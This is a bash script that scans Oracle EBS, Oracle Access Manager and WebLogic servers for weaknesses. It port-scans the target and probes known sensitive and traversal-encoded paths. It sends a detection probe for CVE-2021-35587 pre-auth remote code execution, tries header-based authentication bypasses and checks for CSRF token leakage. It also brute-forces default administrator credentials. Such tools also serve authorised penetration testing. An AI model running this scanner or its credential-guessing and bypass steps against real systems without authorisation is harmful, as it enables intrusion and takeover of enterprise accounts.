#!/bin/bash
# Oracle EBS + OAM Quick Scanner
# Usage: ./quickscan.sh <host> [port]
# Example: ./quickscan.sh 10.10.1.5
#          ./quickscan.sh target.internal 8443

TARGET="${1:?Usage: $0 <host> [port]}"
PORT="${2:-443}"
SCHEME="https"
BASE="$SCHEME://$TARGET:$PORT"
TIMEOUT=6

# Colors
R='\033[91m'; Y='\033[93m'; G='\033[92m'
B='\033[94m'; C='\033[96m'; W='\033[1m'; RS='\033[0m'

hit()  { echo -e "${R}[★ $1]${RS} $2  ${C}(${3}b)${RS}"; }
redir(){ echo -e "${Y}[→ $1]${RS} $2  ${C}→ $3${RS}"; }
info(){ echo -e "${B}[  $1]${RS} $2  ${C}(${3}b)${RS}"; }

banner() {
echo -e "
${W}╔══════════════════════════════════════════════╗
║   Oracle EBS / OAM Quick Scanner             ║
║   Target : $TARGET:$PORT
╚══════════════════════════════════════════════╝${RS}
"
}

# ── Port check ────────────────────────────────────────────────────────────────
port_check() {
    echo -e "\n${W}── PORT SCAN ─────────────────────────────────────${RS}"
    for p in 80 443 7001 7002 7201 7202 14100 14101 5575 8080 8443; do
        if timeout 2 bash -c "echo >/dev/tcp/$TARGET/$p" 2>/dev/null; then
            echo -e "  ${G}OPEN${RS}  $TARGET:$p"
        fi
    done
}

# ── Generic HTTP probe ────────────────────────────────────────────────────────
probe() {
    local path="$1"
    local resp code size loc

    resp=$(curl -sk -o /tmp/_body.tmp -w "%{http_code} %{size_download}" \
        -m $TIMEOUT -L0 \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        "$BASE$path" 2>/dev/null)

    code=$(echo "$resp" | awk '{print $1}')
    size=$(echo "$resp" | awk '{print $2}')

    loc=$(curl -sk -o /dev/null -w "%{redirect_url}" \
        -m $TIMEOUT \
        -H "User-Agent: Mozilla/5.0" \
        "$BASE$path" 2>/dev/null)

    case "$code" in
        200) hit  "$code" "$path" "$size" ;;
        301|302|303) redir "$code" "$path" "$loc" ;;
        400|401|403|500|503)
             info  "$code" "$path" "$size" ;;
        *)   : ;;  # 404/000 — skip
    esac
}

# ── EBS paths ─────────────────────────────────────────────────────────────────
scan_ebs() {
    echo -e "\n${W}── ORACLE EBS PATHS ──────────────────────────────${RS}"
    local paths=(
        "/OA_HTML/AppsLocalLogin.jsp"
        "/OA_HTML/AppsLogin"
        "/OA_HTML/BneUploaderService"
        "/OA_HTML/BneApplicationService"
        "/OA_HTML/JavaScriptServlet"
        "/OA_HTML/OAErrorPage.jsp"
        "/OA_HTML/OA.jsp?OAFunc=AMS_ADMIN"
        "/OA_HTML/OA.jsp?OAFunc=CRM_HOME"
        "/OA_HTML/OA.jsp?OAFunc=ISTORE_HOME"
        "/OA_HTML/ieshostedsurvey.jsp"
        "/OA_HTML/iessurveyruntimeegraph.jsp"
        "/OA_HTML/configurator/UiServlet"
        "/OA_HTML/SyncServlet"
        "/OA_HTML/ibytransmit"
        "/OA_HTML/FNDSQ.exe"
        "/OA_CGI/FNDWRR.exe"
        "/OA_CGI/FNDWRR.exe?temp_id=1"
        "/OA_HTML/configurator%2fUiServlet"
        "/OA_HTML/help%2f..%2fieshostedsurvey.jsp"
        "/OA_HTML/help%2f..%2fibytransmit"
        "/OA_HTML/ams/AmsImport.jsp"
        "/OA_HTML/ams/AmsBatchUpload.jsp"
        "/OA_HTML/cabo%2f..%2fieshostedsurvey.jsp"
    )
    for p in "${paths[@]}"; do probe "$p"; done
}

# ── OAM paths ─────────────────────────────────────────────────────────────────
scan_oam() {
    echo -e "\n${W}── ORACLE ACCESS MANAGER (OAM) PATHS ────────────${RS}"
    local paths=(
        "/accessgate/ssologin"
        "/accessgate/login"
        "/oamconsole"
        "/oamconsole/faces/sign-in"
        "/console"
        "/console/j_security_check"
        "/em"
        "/iam/admin"
        "/iam/admin/config/discovery"
        "/iam/admin/config/oam-config.xml"
        "/oam/admin/api/v1/config/discovery"
        "/oam/admin/api/v1/oam/runtime/diagnostics"
        "/oam/server/info"
        "/oam/server/auth_cred_submit"
        "/oam/server/obrareq.cgi"
        "/oam/OAMAuthnEngine"
        "/oam/IdentityAssertion"
        "/oam/proxy/agent"
        "/ms_oauth/oauth2/endpoints/oauthservice/discovery"
        "/ms_oauth/oauth2/endpoints/oauthservice/tokens"
        "/.well-known/openid-configuration"
        "/identity/faces/signin"
        "/sso/v1/sdk/sign-on"
        "/oam/version.txt"
        "/oamconsole/iam/access/addpolicydomain"
    )
    for p in "${paths[@]}"; do probe "$p"; done
}

# ── WebLogic paths ────────────────────────────────────────────────────────────
scan_wls() {
    echo -e "\n${W}── WEBLOGIC PATHS ────────────────────────────────${RS}"
    local paths=(
        "/console"
        "/console/"
        "/console/login/LoginForm.jsp"
        "/console/j_security_check"
        "/management/weblogic/latest/serverConfig"
        "/bea_wls_internal/classes"
        "/_async/AsyncResponseService"
        "/wls-wsat/CoordinatorPortType"
        "/ws_utc/begin.do"
        "/ws_utc/config.do"
        "/@/filedownload"
        "/%c0%2f..%2fconsole"
    )
    for p in "${paths[@]}"; do probe "$p"; done
}

# ── CVE-2021-35587 quick check ────────────────────────────────────────────────
check_cve_2021_35587() {
    echo -e "\n${W}── CVE-2021-35587 — OAM Pre-Auth RCE (CVSS 9.8) ─${RS}"
    local path="/iam/admin/config/discovery"
    echo -ne "  GET $path ... "
    resp=$(curl -sk -o /tmp/_deser.tmp -w "%{http_code}" -m $TIMEOUT "$BASE$path")
    echo -e "HTTP $resp  ($(wc -c < /tmp/_deser.tmp)b)"

    if [ "$resp" = "200" ]; then
        echo -e "  ${R}[★ ACCESSIBLE — sending XML probe]${RS}"
        code2=$(curl -sk -o /tmp/_deser2.tmp -w "%{http_code}" -m $TIMEOUT \
            -X POST -H "Content-Type: application/xml" \
            -d '<?xml version="1.0"?><OAMConfig><OAMComponent name="probe"/></OAMConfig>' \
            "$BASE$path")
        body=$(cat /tmp/_deser2.tmp)
        echo -e "  POST probe → HTTP $code2"
        echo -e "  Body: ${body:0:200}"
        if [ "$code2" = "500" ]; then
            echo -e "\n  ${R}[★ HTTP 500 ON DESER PROBE — LIKELY VULNERABLE]${RS}\n"
        fi
    elif [ "$resp" = "401" ] || [ "$resp" = "403" ]; then
        echo -e "  ${Y}[● Auth required — try bypass headers]${RS}"
        for hdr in "X-Remote-User: admin" "X-Forwarded-For: 127.0.0.1"; do
            code3=$(curl -sk -o /dev/null -w "%{http_code}" -m $TIMEOUT \
                -H "$hdr" "$BASE$path")
            echo -e "  Bypass '$hdr' → HTTP $code3"
        done
    fi
}

# ── CSRF token leak ───────────────────────────────────────────────────────────
check_csrf_leak() {
    echo -e "\n${W}── JavaScriptServlet CSRF Token Leak ─────────────${RS}"
    resp=$(curl -sk -m $TIMEOUT -X POST \
        -H "FETCH-CSRF-TOKEN: 1" -H "CSRF-XHR: YES" \
        -H "User-Agent: Mozilla/5.0" \
        "$BASE/OA_HTML/JavaScriptServlet" 2>/dev/null)
    code=$?
    if echo "$resp" | grep -q "csrftkn:"; then
        tok=$(echo "$resp" | grep -oP 'csrftkn:[A-Z0-9\-]+')
        echo -e "  ${R}[★ CSRF TOKEN LEAKED]: $tok${RS}"
    else
        echo -e "  ${B}Response: ${resp:0:100}${RS}"
    fi
}

# ── Credential in redirect ────────────────────────────────────────────────────
check_cred_redirect() {
    echo -e "\n${W}── Credential Exposure in HTTP Redirect ──────────${RS}"
    loc=$(curl -sk -o /dev/null -w "%{redirect_url}" -m $TIMEOUT \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "usernameField=testuser&passwordField=VISIBLE_PASS_CHECK" \
        "$BASE/OA_HTML/AppsLogin" 2>/dev/null)
    if echo "$loc" | grep -q "VISIBLE_PASS_CHECK"; then
        echo -e "  ${R}[★ PASSWORD IN REDIRECT URL]:${RS}"
        echo -e "  $loc"
    else
        echo -e "  ${G}Not exposed in Location header${RS}"
        [ -n "$loc" ] && echo -e "  Location: $loc"
    fi
}

# ── Default creds quick test ──────────────────────────────────────────────────
check_default_creds() {
    echo -e "\n${W}── Default Credentials (WebLogic + OAM) ──────────${RS}"
    declare -A creds=(
        ["weblogic"]="weblogic1"
        ["weblogic"]="Welcome1"
        ["oamadmin"]="oamadmin"
        ["admin"]="admin"
    )
    for user in weblogic oamadmin admin; do
        for pass in weblogic1 Welcome1 oamadmin admin; do
            data="j_username=$user&j_password=$pass&j_character_encoding=UTF-8"
            code=$(curl -sk -o /dev/null -w "%{http_code}" -m $TIMEOUT \
                -X POST -H "Content-Type: application/x-www-form-urlencoded" \
                -d "$data" \
                "$BASE/console/j_security_check" 2>/dev/null)
            if [ "$code" = "302" ] || [ "$code" = "200" ]; then
                loc=$(curl -sk -o /dev/null -w "%{redirect_url}" -m $TIMEOUT \
                    -X POST -H "Content-Type: application/x-www-form-urlencoded" \
                    -d "$data" "$BASE/console/j_security_check")
                if ! echo "$loc" | grep -qi "error\|login\|fail"; then
                    echo -e "  ${R}[★ VALID CREDS]: $user:$pass → $loc${RS}"
                else
                    echo -e "  ${B}$user:$pass → HTTP $code (failed)${RS}"
                fi
            fi
            sleep 0.3
        done
    done
}

# ── Main ──────────────────────────────────────────────────────────────────────
banner
port_check

echo -e "\n${W}Select scan mode:${RS}"
echo "  1) EBS only"
echo "  2) OAM/flora only"
echo "  3) WebLogic only"
echo "  4) ALL (EBS + OAM + WLS + CVEs)"
echo ""
read -rp "Choice [1-4, default=4]: " choice
choice="${choice:-4}"

case "$choice" in
    1) scan_ebs; check_csrf_leak; check_cred_redirect ;;
    2) scan_oam; check_cve_2021_35587; check_default_creds ;;
    3) scan_wls; check_default_creds ;;
    4)
        scan_ebs
        scan_oam
        scan_wls
        check_cve_2021_35587
        check_csrf_leak
        check_cred_redirect
        check_default_creds
        ;;
esac

echo -e "\n${W}══════════════════════════════════════════════${RS}"
echo -e "${W}  Scan complete — $(date)${RS}"
echo -e "${W}══════════════════════════════════════════════${RS}\n"
